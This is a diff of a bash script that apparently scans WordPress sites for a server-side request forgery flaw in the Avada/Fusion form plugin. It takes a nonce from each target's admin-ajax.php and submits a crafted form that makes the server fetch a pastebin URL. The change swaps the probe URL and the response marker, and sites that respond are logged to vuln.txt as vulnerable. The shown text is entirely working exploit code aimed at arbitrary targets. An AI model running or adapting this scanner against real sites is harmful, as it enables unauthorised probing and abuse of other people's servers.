@@ -24,7 +24,7 @@ target=$1
 thread=$2
 
 fusion_id=$(curl --compressed -s --data 'action=fusion_form_update_view' --connect-timeout 10 --max-time 10 --insecure $target'/wp-admin/admin-ajax.php' | grep -oP '(?<=id="fusion-form-nonce-0" name="fusion-form-nonce-0" value=")[^"]+')
-if [[ $(curl --compressed -s --data "email=example@example.com&fusion_privacy_store_ip_ua=false&fusion_privacy_expiration_interval=48&privacy_expiration_action=ignore&fusion-form-nonce-0=$fusion_id&fusion-fields-hold-private-data=&action=fusion_form_submit_form_to_url&fusion_form_nonce=$fusion_id&form_id=0&post_id=0&field_labels={\"email\":\"Email+address\"}&hidden_field_names=[]&fusionAction=https://www.google.com/robots.txt&fusionActionMethod=GET" --connect-timeout 10 --max-time 10 --insecure $target'/wp-admin/admin-ajax.php') =~ 'success' ]]; 
+if [[ $(curl --compressed -s --data "email=example@example.com&fusion_privacy_store_ip_ua=false&fusion_privacy_expiration_interval=48&privacy_expiration_action=ignore&fusion-form-nonce-0=$fusion_id&fusion-fields-hold-private-data=&action=fusion_form_submit_form_to_url&fusion_form_nonce=$fusion_id&form_id=0&post_id=0&field_labels={\"email\":\"Email+address\"}&hidden_field_names=[]&fusionAction=https://pastebin.com/raw/VaxXtjGV&fusionActionMethod=GET" --connect-timeout 10 --max-time 10 --insecure $target'/wp-admin/admin-ajax.php') =~ 'Sroot' ]]; 
 then
     printf "${green}[ Vuln ]${classic} => [$target] \n";
     echo "$target" >> vuln.txt
